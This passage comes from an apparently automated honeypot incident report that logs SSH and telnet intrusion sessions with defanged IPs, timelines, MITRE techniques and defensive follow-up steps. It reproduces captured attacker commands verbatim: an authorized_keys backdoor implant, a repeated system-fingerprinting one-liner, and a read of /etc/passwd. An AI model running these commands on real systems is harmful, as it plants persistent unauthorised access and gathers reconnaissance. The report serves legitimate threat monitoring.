| **Last Seen** | 2026-07-31 07:31 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:26:19` | `cowrie.session.connect` |
| `2026-07-31 07:26:19` | `cowrie.client.version` |
| `2026-07-31 07:26:19` | `cowrie.client.kex` |
| `2026-07-31 07:26:20` | `cowrie.login.success` |
| `2026-07-31 07:26:22` | `cowrie.session.params` |
| `2026-07-31 07:26:22` | `cowrie.command.input` |
| `2026-07-31 07:26:22` | `cowrie.command.failed` |
| `2026-07-31 07:26:23` | `cowrie.log.closed` |
| `2026-07-31 07:26:23` | `cowrie.session.params` |
| `2026-07-31 07:26:23` | `cowrie.command.input` |
| `2026-07-31 07:26:24` | `cowrie.session.file_download` |
| `2026-07-31 07:26:24` | `cowrie.log.closed` |
| `2026-07-31 07:31:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.117[.]86` to AbuseIPDB if not already reported
- [ ] Block `14.103.117[.]86` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6722935832f5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:26 |
| **Last Seen** | 2026-07-31 07:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:26:23` | `cowrie.session.connect` |
| `2026-07-31 07:26:23` | `cowrie.client.version` |
| `2026-07-31 07:26:23` | `cowrie.client.kex` |
| `2026-07-31 07:26:25` | `cowrie.login.success` |
| `2026-07-31 07:26:27` | `cowrie.session.params` |
| `2026-07-31 07:26:27` | `cowrie.command.input` |
| `2026-07-31 07:26:27` | `cowrie.command.input` |
| `2026-07-31 07:26:27` | `cowrie.command.input` |
| `2026-07-31 07:26:27` | `cowrie.command.input` |
| `2026-07-31 07:26:27` | `cowrie.command.input` |
| `2026-07-31 07:26:27` | `cowrie.command.success` |
| `2026-07-31 07:26:27` | `cowrie.command.input` |
| `2026-07-31 07:26:27` | `cowrie.command.input` |
| `2026-07-31 07:26:27` | `cowrie.command.input` |
| `2026-07-31 07:26:27` | `cowrie.command.input` |
| `2026-07-31 07:26:27` | `cowrie.log.closed` |
| `2026-07-31 07:26:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb68bdf2dfe2

| Field | Detail |
|---|---|
| **Source IP** | `110.227.215[.]90` |
| **First Seen** | 2026-07-31 07:28 |
| **Last Seen** | 2026-07-31 07:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:28:22` | `cowrie.session.connect` |
| `2026-07-31 07:28:23` | `cowrie.client.version` |
| `2026-07-31 07:28:23` | `cowrie.client.kex` |
| `2026-07-31 07:28:25` | `cowrie.login.success` |
| `2026-07-31 07:28:25` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:28:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.227.215[.]90` to AbuseIPDB if not already reported
- [ ] Block `110.227.215[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-486ffc881c53

| Field | Detail |
|---|---|
| **Source IP** | `218.248.19[.]102` |
| **First Seen** | 2026-07-31 07:28 |
| **Last Seen** | 2026-07-31 07:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:28:35` | `cowrie.session.connect` |
| `2026-07-31 07:28:36` | `cowrie.client.version` |
| `2026-07-31 07:28:36` | `cowrie.client.kex` |
| `2026-07-31 07:28:37` | `cowrie.login.success` |
| `2026-07-31 07:28:38` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.248.19[.]102` to AbuseIPDB if not already reported
- [ ] Block `218.248.19[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f19d0c54ffd8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:28 |
| **Last Seen** | 2026-07-31 07:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:28:43` | `cowrie.session.connect` |
| `2026-07-31 07:28:44` | `cowrie.client.version` |
| `2026-07-31 07:28:44` | `cowrie.client.kex` |
| `2026-07-31 07:28:46` | `cowrie.login.success` |
| `2026-07-31 07:28:47` | `cowrie.session.params` |
| `2026-07-31 07:28:47` | `cowrie.command.input` |
| `2026-07-31 07:28:47` | `cowrie.command.input` |
| `2026-07-31 07:28:47` | `cowrie.command.input` |
| `2026-07-31 07:28:47` | `cowrie.command.input` |
| `2026-07-31 07:28:47` | `cowrie.command.input` |
| `2026-07-31 07:28:47` | `cowrie.command.success` |
| `2026-07-31 07:28:47` | `cowrie.command.input` |
| `2026-07-31 07:28:47` | `cowrie.command.input` |
| `2026-07-31 07:28:47` | `cowrie.command.input` |
| `2026-07-31 07:28:47` | `cowrie.command.input` |
| `2026-07-31 07:28:47` | `cowrie.log.closed` |
| `2026-07-31 07:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be7cc0ba592e

| Field | Detail |
|---|---|
| **Source IP** | `92.5.66[.]49` |
| **First Seen** | 2026-07-31 07:28 |
| **Last Seen** | 2026-07-31 07:29 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:28:53` | `cowrie.session.connect` |
| `2026-07-31 07:28:57` | `cowrie.client.version` |
| `2026-07-31 07:28:57` | `cowrie.client.kex` |
| `2026-07-31 07:29:07` | `cowrie.login.success` |
| `2026-07-31 07:29:12` | `cowrie.session.params` |
| `2026-07-31 07:29:12` | `cowrie.command.input` |
| `2026-07-31 07:29:17` | `cowrie.log.closed` |
| `2026-07-31 07:29:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.5.66[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.5.66[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f43eb3b16ed7

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:30 |
| **Last Seen** | 2026-07-31 07:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:30:58` | `cowrie.session.connect` |
| `2026-07-31 07:30:59` | `cowrie.client.version` |
| `2026-07-31 07:30:59` | `cowrie.client.kex` |
| `2026-07-31 07:31:01` | `cowrie.login.success` |
| `2026-07-31 07:31:03` | `cowrie.session.params` |
| `2026-07-31 07:31:03` | `cowrie.command.input` |
| `2026-07-31 07:31:03` | `cowrie.command.input` |
| `2026-07-31 07:31:03` | `cowrie.command.input` |
| `2026-07-31 07:31:03` | `cowrie.command.input` |
| `2026-07-31 07:31:03` | `cowrie.command.input` |
| `2026-07-31 07:31:03` | `cowrie.command.success` |
| `2026-07-31 07:31:03` | `cowrie.command.input` |
| `2026-07-31 07:31:03` | `cowrie.command.input` |
| `2026-07-31 07:31:03` | `cowrie.command.input` |
| `2026-07-31 07:31:03` | `cowrie.command.input` |
| `2026-07-31 07:31:03` | `cowrie.log.closed` |
| `2026-07-31 07:31:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e79a05b091b8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:33 |
| **Last Seen** | 2026-07-31 07:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:33:07` | `cowrie.session.connect` |
| `2026-07-31 07:33:07` | `cowrie.client.version` |
| `2026-07-31 07:33:07` | `cowrie.client.kex` |
| `2026-07-31 07:33:11` | `cowrie.login.success` |
| `2026-07-31 07:33:13` | `cowrie.session.params` |
| `2026-07-31 07:33:13` | `cowrie.command.input` |
| `2026-07-31 07:33:13` | `cowrie.command.input` |
| `2026-07-31 07:33:13` | `cowrie.command.input` |
| `2026-07-31 07:33:13` | `cowrie.command.input` |
| `2026-07-31 07:33:13` | `cowrie.command.input` |
| `2026-07-31 07:33:13` | `cowrie.command.success` |
| `2026-07-31 07:33:13` | `cowrie.command.input` |
| `2026-07-31 07:33:13` | `cowrie.command.input` |
| `2026-07-31 07:33:13` | `cowrie.command.input` |
| `2026-07-31 07:33:13` | `cowrie.command.input` |
| `2026-07-31 07:33:14` | `cowrie.log.closed` |
| `2026-07-31 07:33:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0dc71ab8ce8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:35 |
| **Last Seen** | 2026-07-31 07:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:35:10` | `cowrie.session.connect` |
| `2026-07-31 07:35:11` | `cowrie.client.version` |
| `2026-07-31 07:35:11` | `cowrie.client.kex` |
| `2026-07-31 07:35:13` | `cowrie.login.success` |
| `2026-07-31 07:35:14` | `cowrie.session.params` |
| `2026-07-31 07:35:14` | `cowrie.command.input` |
| `2026-07-31 07:35:14` | `cowrie.command.input` |
| `2026-07-31 07:35:14` | `cowrie.command.input` |
| `2026-07-31 07:35:14` | `cowrie.command.input` |
| `2026-07-31 07:35:14` | `cowrie.command.input` |
| `2026-07-31 07:35:14` | `cowrie.command.success` |
| `2026-07-31 07:35:14` | `cowrie.command.input` |
| `2026-07-31 07:35:14` | `cowrie.command.input` |
| `2026-07-31 07:35:14` | `cowrie.command.input` |
| `2026-07-31 07:35:14` | `cowrie.command.input` |
| `2026-07-31 07:35:15` | `cowrie.log.closed` |
| `2026-07-31 07:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5decce6757a

| Field | Detail |
|---|---|
| **Source IP** | `117.39.63[.]46` |
| **First Seen** | 2026-07-31 07:38 |
| **Last Seen** | 2026-07-31 07:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:38:21` | `cowrie.session.connect` |
| `2026-07-31 07:38:22` | `cowrie.client.version` |
| `2026-07-31 07:38:22` | `cowrie.client.kex` |
| `2026-07-31 07:38:25` | `cowrie.login.success` |
| `2026-07-31 07:38:26` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:38:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.39.63[.]46` to AbuseIPDB if not already reported
- [ ] Block `117.39.63[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-106b8d2e2853

| Field | Detail |
|---|---|
| **Source IP** | `14.23.77[.]27` |
| **First Seen** | 2026-07-31 07:38 |
| **Last Seen** | 2026-07-31 07:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:38:32` | `cowrie.session.connect` |
| `2026-07-31 07:38:33` | `cowrie.client.version` |
| `2026-07-31 07:38:33` | `cowrie.client.kex` |
| `2026-07-31 07:38:37` | `cowrie.login.success` |
| `2026-07-31 07:38:37` | `cowrie.direct-tcpip.request` |
| `2026-07-31 07:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.23.77[.]27` to AbuseIPDB if not already reported
- [ ] Block `14.23.77[.]27` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-680d4b6188b2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:39 |
| **Last Seen** | 2026-07-31 07:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:39:02` | `cowrie.session.connect` |
| `2026-07-31 07:39:02` | `cowrie.client.version` |
| `2026-07-31 07:39:02` | `cowrie.client.kex` |
| `2026-07-31 07:39:03` | `cowrie.login.success` |
| `2026-07-31 07:39:03` | `cowrie.session.params` |
| `2026-07-31 07:39:03` | `cowrie.command.input` |
| `2026-07-31 07:39:03` | `cowrie.command.input` |
| `2026-07-31 07:39:03` | `cowrie.command.input` |
| `2026-07-31 07:39:03` | `cowrie.command.input` |
| `2026-07-31 07:39:04` | `cowrie.command.input` |
| `2026-07-31 07:39:04` | `cowrie.command.success` |
| `2026-07-31 07:39:04` | `cowrie.command.input` |
| `2026-07-31 07:39:04` | `cowrie.command.input` |
| `2026-07-31 07:39:04` | `cowrie.command.input` |
| `2026-07-31 07:39:04` | `cowrie.command.input` |
| `2026-07-31 07:39:04` | `cowrie.log.closed` |
| `2026-07-31 07:39:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d853eb97614

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:42 |
| **Last Seen** | 2026-07-31 07:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:42:42` | `cowrie.session.connect` |
| `2026-07-31 07:42:42` | `cowrie.client.version` |
| `2026-07-31 07:42:42` | `cowrie.client.kex` |
| `2026-07-31 07:42:44` | `cowrie.login.success` |
| `2026-07-31 07:42:45` | `cowrie.session.params` |
| `2026-07-31 07:42:45` | `cowrie.command.input` |
| `2026-07-31 07:42:45` | `cowrie.command.input` |
| `2026-07-31 07:42:45` | `cowrie.command.input` |
| `2026-07-31 07:42:45` | `cowrie.command.input` |
| `2026-07-31 07:42:45` | `cowrie.command.input` |
| `2026-07-31 07:42:45` | `cowrie.command.success` |
| `2026-07-31 07:42:45` | `cowrie.command.input` |
| `2026-07-31 07:42:45` | `cowrie.command.input` |
| `2026-07-31 07:42:45` | `cowrie.command.input` |
| `2026-07-31 07:42:45` | `cowrie.command.input` |
| `2026-07-31 07:42:45` | `cowrie.log.closed` |
| `2026-07-31 07:42:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a4a70f6d02b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-07-31 07:45 |
| **Last Seen** | 2026-07-31 07:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:45:19` | `cowrie.session.connect` |
| `2026-07-31 07:45:19` | `cowrie.client.version` |
| `2026-07-31 07:45:19` | `cowrie.client.kex` |
| `2026-07-31 07:45:20` | `cowrie.login.success` |
| `2026-07-31 07:45:21` | `cowrie.session.params` |
| `2026-07-31 07:45:21` | `cowrie.command.input` |
| `2026-07-31 07:45:21` | `cowrie.command.input` |
| `2026-07-31 07:45:21` | `cowrie.command.input` |
| `2026-07-31 07:45:21` | `cowrie.command.input` |
| `2026-07-31 07:45:21` | `cowrie.command.input` |
| `2026-07-31 07:45:21` | `cowrie.command.success` |
| `2026-07-31 07:45:21` | `cowrie.command.input` |
| `2026-07-31 07:45:21` | `cowrie.command.input` |
| `2026-07-31 07:45:21` | `cowrie.command.input` |
| `2026-07-31 07:45:21` | `cowrie.command.input` |
| `2026-07-31 07:45:22` | `cowrie.log.closed` |
| `2026-07-31 07:45:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e96545daab62

| Field | Detail |
|---|---|
| **Source IP** | `47.236.161[.]139` |
| **First Seen** | 2026-07-31 07:45 |
| **Last Seen** | 2026-07-31 07:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 07:45:24` | `cowrie.session.connect` |
| `2026-07-31 07:45:24` | `cowrie.telnet.option` |
| `2026-07-31 07:45:25` | `cowrie.telnet.option` |
| `2026-07-31 07:45:25` | `cowrie.login.success` |
| `2026-07-31 07:45:25` | `cowrie.session.params` |
| `2026-07-31 07:45:26` | `cowrie.telnet.option` |
| `2026-07-31 07:45:26` | `cowrie.telnet.option` |
| `2026-07-31 07:45:26` | `cowrie.command.input` |
| `2026-07-31 07:45:26` | `cowrie.command.input` |
| `2026-07-31 07:45:26` | `cowrie.command.input` |
| `2026-07-31 07:45:26` | `cowrie.command.input` |
| `2026-07-31 07:45:26` | `cowrie.command.failed` |
| `2026-07-31 07:45:26` | `cowrie.command.input` |
| `2026-07-31 07:45:26` | `cowrie.command.failed` |
| `2026-07-31 07:45:26` | `cowrie.command.input` |
| `2026-07-31 07:45:26` | `cowrie.command.failed` |
| `2026-07-31 07:45:26` | `cowrie.command.input` |
| `2026-07-31 07:45:26` | `cowrie.command.input` |
| `2026-07-31 07:45:26` | `cowrie.command.input` |
| `2026-07-31 07:45:26` | `cowrie.command.input` |
| `2026-07-31 07:45:26` | `cowrie.command.input` |
| `2026-07-31 07:45:26` | `cowrie.command.input` |
| `2026-07-31 07:45:26` | `cowrie.log.closed` |
